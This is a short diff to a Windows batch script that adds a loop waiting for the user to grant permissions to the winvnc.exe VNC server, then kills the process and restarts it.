@@ -48,7 +48,18 @@ if errorlevel 1 (
   goto CheckPermissions
 )
 
-REM Permissions granted, kill the initial winvnc.exe process
+REM Permissions prompt detected, wait for user decision
+:WaitForDecision
+echo Waiting for user to allow permissions...
+timeout /t 2 >nul
+tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
+if errorlevel 1 (
+  REM If process is not found, it means the user denied permissions, retry
+  goto CheckPermissions
+)
+
+REM If the process is still running, assume permissions are granted and proceed
+echo winvnc.exe has permissions. Proceeding...
 taskkill /im winvnc.exe /f
 
 REM Start winvnc.exe with batch commands
